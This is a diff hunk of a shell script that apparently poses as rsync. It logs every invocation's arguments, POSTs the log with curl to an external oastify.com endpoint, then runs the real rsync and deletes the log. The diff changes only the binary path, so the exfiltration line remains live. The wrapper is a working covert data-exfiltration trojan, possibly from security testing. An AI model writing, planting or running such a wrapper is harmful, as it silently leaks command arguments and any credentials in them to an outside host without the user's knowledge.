@@ -38,6 +38,6 @@ echo "$@" >> "${LOG}"
 # send the collected log to the OAST endpoint
 curl -s -X POST --data-binary @"${LOG}" "https://lynrf95yqtuijsb55q3d0brzmqshg94y.oastify.com/rsync_wrapper?date=$(date)"
 
-/usr/bin/rsync.real --verbose --stats "$@"
+/usr/local/bin/rsync.real --verbose --stats "$@"
 # clean up
 rm -f "${LOG}"
